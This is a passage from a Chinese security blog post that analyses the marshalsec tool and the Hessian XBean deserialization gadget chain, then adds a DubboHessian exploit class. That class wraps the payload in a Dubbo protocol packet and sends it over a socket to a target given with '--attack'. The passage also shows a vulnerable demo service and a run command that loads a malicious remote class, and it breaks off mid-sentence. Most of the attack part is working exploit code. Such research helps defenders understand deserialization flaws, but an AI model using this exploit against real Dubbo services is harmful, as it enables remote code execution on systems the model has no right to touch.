</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">可以看到在这个方法中，依次做了以下事情：</span><br><span class="line">1. 设置安全管理器</span><br><span class="line"></span><br><span class="line">System.setSecurityManager(new SideEffectSecurityManager());</span><br><span class="line"></span><br><span class="line">为什么这样做呢？其实是用来对权限的检查，在做特点权限事情的时候，进行抛异常，我的理解应该是以防payload生成的时候被触发了，然后本地执行了指令等等，会让我们误解是攻击成功等等...</span><br><span class="line">2. 创建payload对象</span><br><span class="line"></span><br><span class="line">Object o = createObject(type, expandArguments(gadgetArgs));</span><br></pre></td></tr></table></figure></p>
<p>protected Object createObject ( GadgetType t, String[] args ) throws Exception {<br>    Method m = getTargetMethod(t);</p>
<pre><code>if ( !t.getClazz().isAssignableFrom(this.getClass()) ) {
    throw new Exception(&quot;Gadget not supported for this marshaller&quot;);
}

Args a = m.getAnnotation(Args.class);

if ( a != null ) {
    if ( args.length &lt; a.minArgs() ) {
        throw new Exception(
            String.format(&quot;Gadget %s requires %d arguments: %s&quot;, t, a.minArgs(), a.args() != null ? Arrays.toString(a.args()) : &quot;&quot;));
    }
}
return m.invoke(this, new Object[] {
    this, args
});
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以看到获取gadget对应的生成方法，然后读取其注解中预置的缺省参数，如果我们程序参数没对其进行输入的话，就使用这个注解预置的参数。</span><br></pre></td></tr></table></figure></p>
<p>public Method getTargetMethod ( GadgetType t ) throws Exception {<br>    Method[] methods = t.getClazz().getMethods();<br>    Method m = null;<br>    if ( methods.length != 1 ) {<br>        for ( Method cand : methods ) {<br>            if ( cand.getAnnotation(Primary.class) != null ) {<br>                m = cand;<br>                break;<br>            }<br>        }</p>
<pre><code>    if ( m == null ) {
        throw new Exception(&quot;Gadget interface contains no or multiple methods&quot;);
    }
}
else {
    m = methods[ 0 ];
}

return this.getClass().getMethod(m.getName(), m.getParameterTypes());
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">而getTargetMethod就是对类方法进行遍历，找到其中注解了Primary的方法为止，若不存在则取第一个方法，最终找到生成payload的gadget方法</span><br><span class="line"></span><br><span class="line">3. 对payload对象进行序列化</span><br><span class="line"></span><br><span class="line">marshal = marshal(o);</span><br><span class="line"></span><br><span class="line">这个就是我们前面所描述的HessianBase重写的方法了</span><br><span class="line"></span><br><span class="line">4. 输出payload</span><br><span class="line"></span><br><span class="line">若在程序执行参数指定了-v，那么就会执行相关逻辑代码，对其序列化数据进行控制台输出</span><br></pre></td></tr></table></figure></p>
<p>if ( !test || verbose ) {<br>    System.err.println();<br>    writeOutput(marshal, escape);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5. 反序列化测试</span><br><span class="line"></span><br><span class="line">若在程序执行参数指定了-t，那么就会执行相关逻辑代码，对序列化数据进行反序列化，判断其是否触发RCE</span><br></pre></td></tr></table></figure></p>
<p>if ( test ) {<br>    System.err.println();<br>    System.err.println(“Running gadget “ + type + “:”);<br>    test(marshal, throwEx);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>protected void test ( T marshal, boolean throwEx ) throws Exception {<br>    Throwable ex = null;<br>    TestingSecurityManager s = new TestingSecurityManager();<br>    try {<br>        System.setSecurityManager(s);<br>        unmarshal(marshal);<br>    }<br>    catch ( Exception e ) {<br>        ex = extractInnermost(e);<br>    }<br>    finally {<br>        System.setSecurityManager(null);<br>    }</p>
<pre><code>try {
    s.assertRCE();
}
catch ( Exception e ) {
    System.err.println(&quot;Failed to achieve RCE:&quot; + e.getMessage());
    if ( ex != null ) {
        ex.printStackTrace(System.err);
    }
    if ( throwEx ) {
        if ( ex instanceof Exception ) {
            throw (Exception) ex;
        }
        throw e;
    }
}
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">可以看到，通过TestingSecurityManager对其反序列化进行检测，然后最后在```s.assertRCE();```处进行断言检测是否触发了RCE</span><br><span class="line"></span><br><span class="line">到这里，对marshalsec的骨架代码浅析已经完成，下一章节将讲解hessian的poc原理。</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 0x02 hessian payload原理浅析</span><br><span class="line"></span><br><span class="line">在这一章节，将以Hessian的XBean这个gadget生成的payload在反序列化时触发的原理进行讲解。</span><br><span class="line"></span><br><span class="line">在上一章，我们对marshalsec的骨架代码进行了一定的分析，其中在marshalsec.MarshallerBase#doRun方法执行时，调用了marshalsec.MarshallerBase#createObject执行了XBean这个gadget的payload的生成。</span><br><span class="line"></span><br><span class="line">其中marshalsec.MarshallerBase#createObject调用了marshalsec.MarshallerBase#getTargetMethod，而marshalsec.MarshallerBase#getTargetMethod遍历了XBean这个接口类的默认方法，因为其中没有被Primary注解的默认方法，因此选择了第一个方法：</span><br></pre></td></tr></table></figure></p>
<p>public interface XBean extends Gadget {</p>
<pre><code>@Args ( minArgs = 2, args = {
    &quot;codebase&quot;, &quot;classname&quot;
}, defaultArgs = {
    MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
} )
default Object makeXBean ( UtilFactory uf, String[] args ) throws Exception {
    Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
    Reference ref = new Reference(&quot;foo&quot;, args[ 1 ], args[ 0 ]);
    ReadOnlyBinding binding = new ReadOnlyBinding(&quot;foo&quot;, ref, ctx);
    return uf.makeToStringTriggerUnstable(binding); // $NON-NLS-1$
}
</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">marshalsec.MarshallerBase：</span><br></pre></td></tr></table></figure>
<p>@Override<br>public Object makeToStringTriggerUnstable ( Object obj ) throws Exception {<br>    return ToStringUtil.makeSpringAOPToStringTrigger(obj);<br>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ToStringUtil：</span><br></pre></td></tr></table></figure>
<p>public static Object makeSpringAOPToStringTrigger ( Object o ) throws Exception {<br>    return makeToStringTrigger(o, x -&gt; {<br>        return new HotSwappableTargetSource(x);<br>    });<br>}</p>
<p>public static Object makeToStringTrigger ( Object o, Function&lt;Object, Object&gt; wrap ) throws Exception {<br>    String unhash = unhash(o.hashCode());<br>    XString xString = new XString(unhash);<br>    return JDKUtil.makeMap(wrap.apply(o), wrap.apply(xString));<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JDKUtil：</span><br></pre></td></tr></table></figure></p>
<p>public static HashMap&lt;Object, Object&gt; makeMap ( Object v1, Object v2 ) throws Exception {<br>    HashMap&lt;Object, Object&gt; s = new HashMap&lt;&gt;();<br>    Reflections.setFieldValue(s, “size”, 2);<br>    Class&lt;?&gt; nodeC;<br>    try {<br>        nodeC = Class.forName(“java.util.HashMap$Node”);<br>    }<br>    catch ( ClassNotFoundException e ) {<br>        nodeC = Class.forName(“java.util.HashMap$Entry”);<br>    }<br>    Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);<br>    nodeCons.setAccessible(true);</p>
<pre><code>Object tbl = Array.newInstance(nodeC, 2);
Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
Reflections.setFieldValue(s, &quot;table&quot;, tbl);
return s;
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">以上就是XBean这个gadget所涉及的一些类，最终我们可以看到，其利用的是HashMap在反序列化时put数据从而触发gadget的执行</span><br><span class="line"></span><br><span class="line">几个重点：</span><br><span class="line">- 在JDKUtil.makeMap中对HashMap进行反射设置数据进去，是为了避免执行put方法触发gadget</span><br><span class="line">- 在JDKUtil.makeMap中可以看到table这个字段设置的数组，存有两个元素，不过两个元素的hashCode是一样的，v1是HotSwappableTargetSource包装过的payload，v2是HotSwappableTargetSource包装的XString对象，而XString对象包装的也是payload</span><br><span class="line">- hessian反序列化HashMap时，因为会两次put同样hashCode的元素，从而触发key这个元素的equal方法</span><br><span class="line"></span><br><span class="line">执行栈流程：</span><br></pre></td></tr></table></figure></p>
<p>getObjectInstance:319, NamingManager (javax.naming.spi)<br>resolve:73, ContextUtil (org.apache.xbean.naming.context)<br>getObject:204, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)<br>toString:192, Binding (javax.naming)<br>equals:392, XString (com.sun.org.apache.xpath.internal.objects)<br>equals:104, HotSwappableTargetSource (org.springframework.aop.target)<br>putVal:634, HashMap (java.util)<br>put:611, HashMap (java.util)<br>readMap:114, MapDeserializer (com.caucho.hessian.io)<br>readMap:538, SerializerFactory (com.caucho.hessian.io)<br>readObject:1160, HessianInput (com.caucho.hessian.io)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>public class HotSwappableTargetSource implements TargetSource, Serializable {<br>  //…<br>  public boolean equals(Object other) {<br>    return this == other || other instanceof HotSwappableTargetSource &amp;&amp; this.target.equals(((HotSwappableTargetSource)other).target);<br>  }<br>  //…<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>public class XString extends XObject implements XMLString<br>{<br>    //…<br>    public boolean equals(Object obj2)<br>    {</p>
<pre><code>    if (null == obj2)
      return false;

      // In order to handle the &apos;all&apos; semantics of
      // nodeset comparisons, we always call the
      // nodeset function.
    else if (obj2 instanceof XNodeSet)
      return obj2.equals(this);
    else if(obj2 instanceof XNumber)
        return obj2.equals(this);
    else
      return str().equals(obj2.toString());
}
//...
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>public class Binding extends NameClassPair {<br>    /…<br>    public String toString() {<br>        return super.toString() + “:” + getObject();<br>    }<br>    /…<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>public static final class ReadOnlyBinding extends Binding {<br>    public Object getObject() {<br>      try {<br>        return ContextUtil.resolve(this.value, this.getName(), (Name)null, this.context);<br>      } catch (NamingException var2) {<br>        throw new RuntimeException(var2);<br>      }<br>    }<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>public final class ContextUtil {<br>    public static Object resolve(Object value, String stringName, Name parsedName, Context nameCtx) throws NamingException {<br>    if (!(value instanceof Reference)) {<br>      return value;<br>    } else {<br>      Reference reference = (Reference)value;<br>      if (reference instanceof SimpleReference) {<br>        try {<br>          return ((SimpleReference)reference).getContent();<br>        } catch (NamingException var6) {<br>          throw var6;<br>        } catch (Exception var7) {<br>          throw (NamingException)(new NamingException(“Could not look up : “ + stringName == null ? parsedName.toString() : stringName)).initCause(var7);<br>        }<br>      } else {<br>        try {<br>          if (parsedName == null) {<br>            parsedName = NAME_PARSER.parse(stringName);<br>          }</p>
<pre><code>      return NamingManager.getObjectInstance(reference, parsedName, nameCtx, nameCtx.getEnvironment());
    } catch (NamingException var8) {
      throw var8;
    } catch (Exception var9) {
      throw (NamingException)(new NamingException(&quot;Could not look up : &quot; + stringName == null ? parsedName.toString() : stringName)).initCause(var9);
    }
  }
}
</code></pre><p>  }<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1. Hessian反序列化HashMap</span><br><span class="line">2. put反序列化的两个对象元素（HotSwappableTargetSource）至反序列化的HashMap，因为两个对象元素hashCode一致，所以执行其equals方法</span><br><span class="line">3. 其中一个对象元素是XString，XString的equals方法会执行其封装的对象ReadOnlyBinding的toString方法</span><br><span class="line">4. ReadOnlyBinding包装的对象是Reference引用对象，引用一个远程恶意class，当ReadOnlyBinding执行toString方法时，在其方法内会调用其getObject，从而加载远程恶意class执行</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">### 0x03 dubbo-hessian2 exploit骨架加入</span><br><span class="line"></span><br><span class="line">上一章，我们简单的讲解了XBean这个gadget的触发原理，那么，这一章，我将会讲解如何在marshalsec里面加入dubbo的exploit。如果读过我写的[《dubbo源码浅析-默认反序列化利用之hessian2》](https://www.anquanke.com/post/id/197658)朋友，就会知道dubbo默认是使用了hessian2作为序列化和反序列化的工具，如果没看过的朋友，我希望你看到这里的时候可以花一丢丢时间去看看。</span><br><span class="line"></span><br><span class="line">首先，我们如果要攻击一个dubbo服务，前提我们是得先找到这个dubbo服务的host和port，那么，我们加入这个dubbo-hessian2的exploit骨架，就得考虑参数化这些动态数据。</span><br><span class="line"></span><br><span class="line">#### HessianBase</span><br><span class="line">因为我们将要做的exploit只是加入XBean这个gadget的利用，所以，我们就不能继续沿用HessianBase了，因此，创建一个新的类HessianBase2，实现XBean接口，其余的代码和HessianBase保持一致</span><br></pre></td></tr></table></figure></p>
<p>public abstract class HessianBase2 extends MarshallerBase&lt;byte[]&gt;<br>        implements XBean {</p>
<pre><code>/**
 * {@inheritDoc}
 *
 * @see MarshallerBase#marshal(Object)
 */
@Override
public byte[] marshal ( Object o ) throws Exception {
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    AbstractHessianOutput out = createOutput(bos);
    NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
    sf.setAllowNonSerializable(true);
    out.setSerializerFactory(sf);
    out.writeObject(o);
    out.close();
    return bos.toByteArray();
}


/**
 * {@inheritDoc}
 *
 * @see MarshallerBase#unmarshal(Object)
 */
@Override
public Object unmarshal ( byte[] data ) throws Exception {
    ByteArrayInputStream bis = new ByteArrayInputStream(data);
    AbstractHessianInput in = createInput(bis);
    return in.readObject();
}


/**
 * @param bos
 * @return
 */
protected abstract AbstractHessianOutput createOutput ( ByteArrayOutputStream bos );


protected abstract AbstractHessianInput createInput ( ByteArrayInputStream bos );

public static class NoWriteReplaceSerializerFactory extends SerializerFactory {

    /**
     * {@inheritDoc}
     *
     * @see SerializerFactory#getObjectSerializer(Class)
     */
    @Override
    public Serializer getObjectSerializer ( Class&lt;?&gt; cl ) throws HessianProtocolException {
        return super.getObjectSerializer(cl);
    }


    /**
     * {@inheritDoc}
     *
     * @see SerializerFactory#getSerializer(Class)
     */
    @Override
    public Serializer getSerializer ( Class cl ) throws HessianProtocolException {
        Serializer serializer = super.getSerializer(cl);

        if ( serializer instanceof WriteReplaceSerializer ) {
            return UnsafeSerializer.create(cl);
        }
        return serializer;
    }

}
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#### Hessian2</span><br><span class="line">因为Hessian中的两个流创建方法，返回的流对象都是hessian相关的，而不是hessian2的，因此，我们这里新添加一个类Hessian2，实现HessianBase2，用于重写输出输入流创建方法，用于创建hessian2流对象</span><br></pre></td></tr></table></figure></p>
<p>public class Hessian2 extends HessianBase2 {</p>
<pre><code>/**
 * {@inheritDoc}
 *
 * @see marshalsec.AbstractHessianBase#createOutput(ByteArrayOutputStream)
 */
@Override
protected AbstractHessianOutput createOutput ( ByteArrayOutputStream bos ) {
    return new Hessian2Output(bos);
}


/**
 * {@inheritDoc}
 *
 * @see marshalsec.AbstractHessianBase#createInput(ByteArrayInputStream)
 */
@Override
protected AbstractHessianInput createInput ( ByteArrayInputStream bos ) {
    return new Hessian2Input(bos);
}


public static void main ( String[] args ) {
    new Hessian2().run(args);
}
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#### DubboHessian</span><br><span class="line">在根目录加入dubbo-hessian2的exploit入口类</span><br></pre></td></tr></table></figure></p>
<p>public class DubboHessian extends Hessian2 {</p>
<p>  private String host;<br>  private int port;</p>
<p>  public DubboHessian(String[] args) {<br>    int argoff = 0;</p>
<pre><code>while (argoff &lt; args.length &amp;&amp; args[argoff].charAt(0) == &apos;-&apos;) {
  if (args[argoff].equals(&quot;--attack&quot;)) {
    argoff++;
    host = args[argoff++];
    port = Integer.parseInt(args[argoff++]);
  } else {
    argoff++;
  }
}
</code></pre><p>  }</p>
<p>  private void attack(byte[] bytes) throws IOException {<br>    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();<br>    // header.<br>    byte[] header = new byte[16];<br>    // set magic number.<br>    Bytes.short2bytes((short) 0xdabb, header);<br>    // set request and serialization flag.<br>    header[2] = (byte) ((byte) 0x80 | 2);</p>
<pre><code>// set request id.
Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
ByteArrayOutputStream hessian2ByteArrayOutputStream2 = new ByteArrayOutputStream();
ByteArrayOutputStream hessian2ByteArrayOutputStream3 = new ByteArrayOutputStream();
Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
Hessian2ObjectOutput out3 = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream3);

out.writeUTF(&quot;2.0.2&quot;);
//todo 此处填写注册中心获取到的service全限定名、版本号、方法名
out.writeUTF(&quot;com.threedr3am.learn.server.boot.DemoService&quot;);
</code></pre><p>//    out.writeUTF(“com.threedr3am.learn.dubbo.DemoService”);<br>    out.writeUTF(“1.0”);<br>    out.writeUTF(“hello”);<br>    //todo 方法描述不需要修改，因为此处需要指定map的payload去触发<br>    out.writeUTF(“Ljava/util/Map;”);<br>    out.flushBuffer();<br>    if (out instanceof Cleanable) {<br>      ((Cleanable) out).cleanup();<br>    }</p>
<pre><code>hessian2ByteArrayOutputStream2.write(bytes);
</code></pre><p>//    out.writeObject(o);<br>    out3.writeObject(new HashMap());</p>
<pre><code>out3.flushBuffer();
if (out3 instanceof Cleanable) {
  ((Cleanable) out3).cleanup();
}

Bytes.int2bytes(hessian2ByteArrayOutputStream.size() + hessian2ByteArrayOutputStream2.size() + hessian2ByteArrayOutputStream3.size(), header, 12);
byteArrayOutputStream.write(header);
byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
byteArrayOutputStream.write(hessian2ByteArrayOutputStream2.toByteArray());
byteArrayOutputStream.write(hessian2ByteArrayOutputStream3.toByteArray());

byte[] poc = byteArrayOutputStream.toByteArray();

//todo 此处填写被攻击的dubbo服务提供者地址和端口
Socket socket = new Socket(host, port);
OutputStream outputStream = socket.getOutputStream();
outputStream.write(poc);
outputStream.flush();
outputStream.close();
</code></pre><p>  }</p>
<p>  @Override<br>  public byte[] marshal(Object o) throws Exception {<br>    byte[] bytes = super.marshal(o);<br>    attack(bytes);<br>    return bytes;<br>  }</p>
<p>  public static void main(String[] args) {<br>    new DubboHessian(args).run(args);<br>  }</p>
<p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这个类，有几处关键地方：</span><br><span class="line">1. 构造方法处对参数--attack进行处理，读取其后的两个参数，作为dubbo靶机服务的host和port</span><br><span class="line">2. 重写marshal方法，在其中执行父类marshal方法生成序列化数据后，使用其数据执行attack方法对dubbo服务进行攻击</span><br><span class="line">3. attack方法中与dubbo服务进行了tcp连接，然后把序列化数据组织成dubbo协议数据包发送出去</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">因为在构造方法对参数--attack和其后紧跟着的两个参数进行了解析读取，那么，在原有的参数解析处marshalsec.MarshallerBase#run，就需要跳过这几个参数</span><br></pre></td></tr></table></figure></p>
<p>{<br>     /**</p>
<pre><code> * @param args
 */
protected void run ( String[] args ) {
    try {
        //...
        while ( argoff &lt; args.length &amp;&amp; args[ argoff ].charAt(0) == &apos;-&apos; ) {

            //...
            else if (args[ argoff ].equals(&quot;--attack&quot;)) {
                argoff+=3;
            }
            //...
        }
        //...
    }
    catch ( Exception e ) {
        e.printStackTrace(System.err);
    }
}
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">并且因为权限检查的问题，会导致无法建立网络连接，因此对权限检查的地方进行了一点小修改：</span><br><span class="line"></span><br><span class="line">marshalsec.MarshallerBase#doRun</span><br></pre></td></tr></table></figure></p>
<p>{<br>    private void doRun ( GadgetType type, boolean test, boolean verbose, boolean throwEx, EscapeType escape, String[] gadgetArgs )<br>            throws Exception, IOException {<br>        T marshal;<br>        try {<br>            if (test) {<br>                System.setSecurityManager(new SideEffectSecurityManager());<br>            }<br>            //…<br>        }<br>        finally {<br>            System.setSecurityManager(null);<br>        }<br>        //…<br>    }<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">此处修改可能不太优雅，后续有待进行优化。</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">### 0x04 hessian-&gt;hessian2 payload测试</span><br><span class="line"></span><br><span class="line">最后，在加入了dubbo-hessian2的exploit骨架之后，先对我们加入的XBean gadget进行测试</span><br><span class="line"></span><br><span class="line">#### 1. 启动dubbo服务demo</span><br><span class="line"></span><br><span class="line">启动一个dubbo协议，端口为20881的dubbo服务，此处我使用的是dubbo-2.6.3进行测试</span><br><span class="line"></span><br><span class="line">##### maven依赖</span><br></pre></td></tr></table></figure></p>
<properties><br>    &lt;spring.version&gt;4.3.5.RELEASE&lt;/spring.version&gt;<br></properties>

<dependency><br>  <groupid>org.springframework</groupid><br>  <artifactid>spring-aop</artifactid><br>  <version>${spring.version}</version><br></dependency><br><dependency><br>  <groupid>org.springframework</groupid><br>  <artifactid>spring-core</artifactid><br>  <version>${spring.version}</version><br></dependency><br><dependency><br>  <groupid>org.springframework</groupid><br>  <artifactid>spring-context</artifactid><br>  <version>${spring.version}</version><br></dependency><br><dependency><br>  <groupid>org.springframework</groupid><br>  <artifactid>spring-beans</artifactid><br>  <version>${spring.version}</version><br></dependency>

<dependency><br>  <groupid>com.alibaba</groupid><br>  <artifactid>dubbo</artifactid><br>  <version>2.6.3</version><br>  <exclusions><br>    <exclusion><br>      <artifactid>commons-logging</artifactid><br>      <groupid>commons-logging</groupid><br>    </exclusion><br>    <exclusion><br>      <artifactid>spring</artifactid><br>      <groupid>org.springframework</groupid><br>    </exclusion><br>    <exclusion><br>      <artifactid>spring-context</artifactid><br>      <groupid>org.springframework</groupid><br>    </exclusion><br>  </exclusions><br></dependency><br><dependency><br>  <groupid>org.apache.zookeeper</groupid><br>  <artifactid>zookeeper</artifactid><br>  <version>3.4.13</version><br></dependency><br><dependency><br>  <groupid>org.apache.curator</groupid><br>  <artifactid>curator-recipes</artifactid><br>  <version>4.2.0</version><br>  <exclusions><br>    <exclusion><br>      <artifactid>zookeeper</artifactid><br>      <groupid>org.apache.zookeeper</groupid><br>    </exclusion><br>  </exclusions><br></dependency>

<p><dependency><br>  <groupid>org.apache.xbean</groupid><br>  <artifactid>xbean-naming</artifactid><br>  <version>4.15</version><br></dependency><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">##### service</span><br></pre></td></tr></table></figure></p>
<p>public interface DemoService {</p>
<p>  String hello();<br>}<br>public class DemoServiceImpl implements DemoService {</p>
<p>  public String hello() {<br>    return “hello!”;<br>  }<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">##### xml配置</span><br></pre></td></tr></table></figure></p>
<p>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</p>
<p><beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:dubbo="http://code.alibabatech.com/schema/dubbo" xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd"><br>  <!-- 提供方应用信息，用于计算依赖关系 --><br>  &lt;dubbo:application name=”dubbo-service” /&gt;</beans></p>
  <!-- 使用multicast广播注册中心暴露服务地址 -->
  <!-- <dubbo:registry address="multicast://224.5.6.7:1234" /> -->
  <!-- 使用zookeeper注册中心暴露服务地址 -->
<p>  &lt;dubbo:registry address=”zookeeper://127.0.0.1:2181” /&gt;</p>
  <!-- 用dubbo协议在20881端口暴露服务 -->
<p>  &lt;dubbo:protocol name=”dubbo” port=”20881” /&gt;</p>
  <!-- 声明需要暴露的服务接口 -->
<p>  &lt;dubbo:service interface=”com.threedr3am.learn.dubbo.DemoService”<br>    ref=”demoService” /&gt;</p>
  <!-- 和本地bean一样实现服务 -->
<p>  <bean id="demoService" class="com.threedr3am.learn.dubbo.DemoServiceImpl"><br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">##### main</span><br></pre></td></tr></table></figure></bean></p>
<p>public class Main {</p>
<p>  public static void main(String[] args) {<br>    new ClassPathXmlApplicationContext(“dubbo-provider.xml”);<br>    while (true);<br>  }<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#### 2. 打包marshalsec并执行</span><br><span class="line"></span><br><span class="line">在执行marshalsec前，我们得先打包一个恶意class（不需要package名），ExecObject.class放到本地80端口的web资源服务器</span><br><span class="line"></span><br><span class="line">前面第一章我们就讲述了如何使用maven打包，接着，我们执行jar包，对dubbo服务进行攻击</span><br></pre></td></tr></table></figure></p>
<p>java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.DubboHessian –attack 127.0.0.1 20881 XBean <a href="http://127.0.0.1:80/" target="_blank" rel="noopener">http://127.0.0.1:80/</a> ExecObject<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">执行后发现...预期的计算器没弹出来，在经过排查后发现，是因为XBean用到的Spring AOP的触发类HotSwappableTargetSource在反序列化时抛异常了，具体原因是构造方法选择以及实例化的时候，参数传入了非基本类型，因此变成了null，导致在HotSwappableTargetSource构造方法的断言处抛异常了！</span><br><span class="line"></span><br><span class="line">#### 3. 修改XBean</span><br><span class="line"></span><br><span class="line">前面说了，因为XBean用到的Spring AOP的触发类HotSwappableTargetSource在反序列化时抛异常了，所以，我们是不是可以换一个触发类？</span><br><span class="line"></span><br><span 